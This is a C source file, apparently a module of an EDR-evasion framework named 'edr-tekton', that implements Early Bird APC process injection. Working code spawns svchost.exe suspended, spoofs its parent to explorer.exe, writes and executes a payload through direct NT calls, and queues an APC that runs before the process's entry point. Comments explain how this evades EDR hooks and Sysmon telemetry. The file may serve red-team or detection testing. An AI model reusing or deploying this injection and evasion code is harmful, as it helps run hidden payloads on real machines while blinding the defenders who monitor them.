/*
 * edr-tekton :: Early Bird APC Injection Module
 * Cat 5.2: Suspended process creation + QueueUserAPC + ResumeThread
 *
 * Creates target process in SUSPENDED state, allocates + writes shellcode,
 * queues APC to the main thread (which has not started), then resumes.
 * The APC executes before the process entry point, potentially before
 * the EDR hook DLL is fully loaded.
 *
 * Key advantages over classic injection:
 *   - Sysmon Event 8 blind spot: QueueUserAPC does NOT fire
 *     CreateRemoteThread telemetry
 *   - Pre-entry execution: shellcode runs before EDR init in target
 *   - Natural parent-child: spawned process with controlled parent
 *
 * Optionally supports PPID spoofing via PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
 * to make the child appear spawned by a legitimate parent (explorer.exe, etc).
 *
 * Pipeline stage: TEKTON_STAGE_INJECT
 */

#include "tekton/modules/inject.h"
#include "tekton/core/log.h"
#include <string.h>
#include <stdlib.h>

/* ── Internal state ─────────────────────────────────────── */

typedef struct _APC_INJECT_STATE {
    TEKTON_INJECT_CFG   cfg;
    char                ppid_spoof_target[256]; /* Parent to spoof, e.g. "explorer.exe" */
    BOOL                use_ppid_spoof;
} APC_INJECT_STATE;

/* ── Nt* function pointer types ─────────────────────────── */

#ifdef _WIN32
typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, DWORD, DWORD
);
typedef NTSTATUS (NTAPI *pfnNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T
);
typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, DWORD, PDWORD
);
typedef NTSTATUS (NTAPI *pfnNtQueueApcThread)(
    HANDLE, PVOID, PVOID, PVOID, PVOID
);
typedef NTSTATUS (NTAPI *pfnNtResumeThread)(
    HANDLE, PULONG
);
typedef NTSTATUS (NTAPI *pfnNtClose)(HANDLE);
#endif

/* ── Module vtable implementation ───────────────────────── */

static TEKTON_STATUS apc_init(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)ctx;

    APC_INJECT_STATE* state = (APC_INJECT_STATE*)malloc(sizeof(APC_INJECT_STATE));
    if (!state) return TEKTON_ERR_ALLOC;

    memset(state, 0, sizeof(*state));

    /* Default: spawn svchost.exe suspended */
    strncpy(state->cfg.spawn_process,
        "C:\\Windows\\System32\\svchost.exe",
        sizeof(state->cfg.spawn_process) - 1);
    state->cfg.create_suspended = TRUE;
    state->cfg.use_syscalls = TRUE;
    state->cfg.allocation_type = MEM_COMMIT | MEM_RESERVE;

    /* PPID spoof to explorer.exe by default */
    state->use_ppid_spoof = TRUE;
    strncpy(state->ppid_spoof_target, "explorer.exe",
        sizeof(state->ppid_spoof_target) - 1);

    self->private_data = state;

    TLOG_DEBUG("inject_apc: init (spawn=%s, ppid_spoof=%s)",
        state->cfg.spawn_process,
        state->use_ppid_spoof ? state->ppid_spoof_target : "none");
    return TEKTON_OK;
}

static TEKTON_STATUS apc_execute(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    APC_INJECT_STATE* state = (APC_INJECT_STATE*)self->private_data;
    if (!state) return TEKTON_ERR_INVALID_STATE;

    BYTE* payload_data = ctx->decrypted.data ? ctx->decrypted.data : ctx->payload.data;
    SIZE_T payload_len = ctx->decrypted.data ? ctx->decrypted.length : ctx->payload.length;

    if (!payload_data || payload_len == 0) {
        TLOG_ERROR("inject_apc: no payload to inject");
        return TEKTON_ERR_INVALID_PARAM;
    }

    if (ctx->dry_run) {
        TLOG_INFO("inject_apc: [DRY RUN] would Early Bird APC inject %lu bytes",
            (unsigned long)payload_len);
        TLOG_INFO("  Spawn: %s (SUSPENDED)", state->cfg.spawn_process);
        TLOG_INFO("  PPID spoof: %s",
            state->use_ppid_spoof ? state->ppid_spoof_target : "disabled");
        TLOG_INFO("  Method: CreateProcess(SUSPENDED) -> Alloc(RW) -> Write -> Protect(RX) -> QueueUserAPC -> ResumeThread");
        return TEKTON_OK;
    }

#ifdef _WIN32
    NTSTATUS nt_status;
    BOOL use_nt = state->cfg.use_syscalls && ctx->resolved.ssns_resolved;

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    DWORD creation_flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;

    /*
     * Step 1: PPID spoofing setup
     * Use PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to make the child
     * appear as if spawned by a legitimate parent process.
     */
    HANDLE hParent = NULL;
    SIZE_T attr_size = 0;

    if (state->use_ppid_spoof) {
        DWORD parent_pid = TektonInjectFindProcess(ctx, state->ppid_spoof_target);
        if (parent_pid != 0) {
            /* Open parent for handle duplication */
            TEKTON_STATUS ps = TektonInjectOpenTarget(ctx, parent_pid,
                PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE);
            if (ps == TEKTON_OK) {
                hParent = ctx->target_handle;
                ctx->target_handle = NULL; /* Don't let cleanup close parent yet */

                /* Initialize attribute list for PPID spoof */
                InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
                si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attr_size);
                if (si.lpAttributeList) {
                    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attr_size);
                    UpdateProcThreadAttribute(
                        si.lpAttributeList, 0,
                        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        &hParent, sizeof(HANDLE), NULL, NULL
                    );
                    creation_flags |= EXTENDED_STARTUPINFO_PRESENT;
                    TLOG_DEBUG("inject_apc: PPID spoof to %s (PID %lu)",
                        state->ppid_spoof_target, (unsigned long)parent_pid);
                }
            } else {
                TLOG_WARN("inject_apc: PPID spoof target '%s' not accessible, proceeding without",
                    state->ppid_spoof_target);
            }
        }
    }

    /* Step 2: Create target process SUSPENDED */
    BOOL created = CreateProcessA(
        NULL,
        state->cfg.spawn_process,
        NULL, NULL,
        FALSE,
        creation_flags,
        NULL, NULL,
        &si.StartupInfo,
        &pi
    );

    if (!created) {
        TLOG_ERROR("inject_apc: CreateProcess failed for '%s'",
            state->cfg.spawn_process);
        if (si.lpAttributeList) {
            DeleteProcThreadAttributeList(si.lpAttributeList);
            free(si.lpAttributeList);
        }
        if (hParent) CloseHandle(hParent);
        return TEKTON_ERR_INJECT_FAIL;
    }

    TLOG_DEBUG("inject_apc: spawned PID %lu (SUSPENDED)",
        (unsigned long)pi.dwProcessId);

    /* Step 3: Allocate RW memory in target */
    PVOID remote_addr = NULL;
    SIZE_T region_size = payload_len;

    if (use_nt && ctx->resolved.fn_nt_allocate_virtual_memory) {
        pfnNtAllocateVirtualMemory pNtAlloc =
            (pfnNtAllocateVirtualMemory)ctx->resolved.fn_nt_allocate_virtual_memory;
        nt_status = pNtAlloc(pi.hProcess, &remote_addr, 0, &region_size,
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_apc: NtAllocateVirtualMemory failed (0x%08lX)",
                (unsigned long)nt_status);
            TerminateProcess(pi.hProcess, 1);
            goto cleanup;
        }
    } else {
        ctx->target_handle = pi.hProcess;
        TEKTON_STATUS as = TektonInjectAllocRemote(ctx, payload_len, PAGE_READWRITE);
        if (as != TEKTON_OK) {
            TerminateProcess(pi.hProcess, 1);
            goto cleanup;
        }
        remote_addr = ctx->remote_base;
    }

    TLOG_DEBUG("inject_apc: allocated %lu bytes at %p", (unsigned long)region_size, remote_addr);

    /* Step 4: Write payload */
    if (use_nt && ctx->resolved.fn_nt_write_virtual_memory) {
        pfnNtWriteVirtualMemory pNtWrite =
            (pfnNtWriteVirtualMemory)ctx->resolved.fn_nt_write_virtual_memory;
        SIZE_T written = 0;
        nt_status = pNtWrite(pi.hProcess, remote_addr, payload_data, payload_len, &written);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_apc: NtWriteVirtualMemory failed");
            TerminateProcess(pi.hProcess, 1);
            goto cleanup;
        }
    } else {
        ctx->target_handle = pi.hProcess;
        ctx->remote_base = remote_addr;
        TEKTON_STATUS ws = TektonInjectWriteRemote(ctx, payload_data, payload_len);
        if (ws != TEKTON_OK) {
            TerminateProcess(pi.hProcess, 1);
            goto cleanup;
        }
    }

    /* Step 5: Flip to RX */
    if (use_nt && ctx->resolved.fn_nt_protect_virtual_memory) {
        pfnNtProtectVirtualMemory pNtProt =
            (pfnNtProtectVirtualMemory)ctx->resolved.fn_nt_protect_virtual_memory;
        DWORD old_prot = 0;
        nt_status = pNtProt(pi.hProcess, &remote_addr, &region_size,
                            PAGE_EXECUTE_READ, &old_prot);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_apc: NtProtectVirtualMemory failed");
            TerminateProcess(pi.hProcess, 1);
            goto cleanup;
        }
    } else {
        DWORD old_prot = 0;
        VirtualProtectEx(pi.hProcess, remote_addr, payload_len,
                         PAGE_EXECUTE_READ, &old_prot);
    }

    /* Step 6: Queue APC to the suspended main thread */
    if (use_nt && ctx->resolved.fn_nt_queue_apc_thread) {
        pfnNtQueueApcThread pNtApc =
            (pfnNtQueueApcThread)ctx->resolved.fn_nt_queue_apc_thread;
        nt_status = pNtApc(pi.hThread, remote_addr, NULL, NULL, NULL);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_apc: NtQueueApcThread failed (0x%08lX)",
                (unsigned long)nt_status);
            TerminateProcess(pi.hProcess, 1);
            goto cleanup;
        }
    } else {
        if (!QueueUserAPC((PAPCFUNC)remote_addr, pi.hThread, 0)) {
            TLOG_ERROR("inject_apc: QueueUserAPC failed");
            TerminateProcess(pi.hProcess, 1);
            goto cleanup;
        }
    }

    TLOG_DEBUG("inject_apc: APC queued to main thread");

    /* Step 7: Resume thread, APC fires before entry point */
    if (use_nt && ctx->resolved.fn_nt_resume_thread) {
        pfnNtResumeThread pNtResume =
            (pfnNtResumeThread)ctx->resolved.fn_nt_resume_thread;
        DWORD suspend_count = 0;
        nt_status = pNtResume(pi.hThread, &suspend_count);
        if (!NT_SUCCESS(nt_status)) {
            TLOG_ERROR("inject_apc: NtResumeThread failed");
            TerminateProcess(pi.hProcess, 1);
            goto cleanup;
        }
    } else {
        ResumeThread(pi.hThread);
    }

    ctx->target_pid = pi.dwProcessId;
    ctx->remote_base = remote_addr;

    TLOG_INFO("inject_apc: Early Bird APC injection complete");
    TLOG_INFO("  Target PID: %lu, payload at %p (%lu bytes)",
        (unsigned long)pi.dwProcessId, remote_addr, (unsigned long)payload_len);

cleanup:
    if (pi.hThread) CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (si.lpAttributeList) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
    }
    if (hParent) CloseHandle(hParent);

    return TEKTON_OK;

#else
    /* Linux dev stub */
    TLOG_INFO("inject_apc: [STUB] would Early Bird APC inject %lu bytes into spawned %s",
        (unsigned long)payload_len, state->cfg.spawn_process);
    return TEKTON_OK;
#endif
}

static VOID apc_cleanup(PTEKTON_MODULE self) {
    if (self->private_data) {
        TEKTON_SECURE_ZERO(self->private_data, sizeof(APC_INJECT_STATE));
        free(self->private_data);
        self->private_data = NULL;
    }
}

static DWORD apc_risk_score(PTEKTON_MODULE self) {
    (void)self;
    /*
     * Moderate risk: QueueUserAPC avoids Sysmon Event 8,
     * but CreateProcess(SUSPENDED) + cross-process alloc/write is visible.
     * PPID spoofing helps with parent-child tree analysis.
     */
    return 30;
}

static BOOL apc_check_compat(PTEKTON_MODULE self, PTEKTON_CONTEXT ctx) {
    (void)self;
    (void)ctx;
    return TRUE;
}

/* ── Module definition + auto-registration ──────────────── */

TEKTON_MODULE tekton_mod_inject_apc = {
    .name           = "inject_apc",
    .description    = "Early Bird APC injection with PPID spoofing (Cat 5.2)",
    .category       = TEKTON_CAT_INJECT,
    .target_surface = TEKTON_SURFACE_KERNEL_CB,
    .flags          = TEKTON_MOD_DESTRUCTIVE,
    .skill_ref      = "5.2",
    .init           = apc_init,
    .execute        = apc_execute,
    .cleanup        = apc_cleanup,
    .get_risk_score = apc_risk_score,
    .check_compat   = apc_check_compat,
    .private_data   = NULL,
    .next           = NULL,
};

TEKTON_DECLARE_MODULE(tekton_mod_inject_apc);
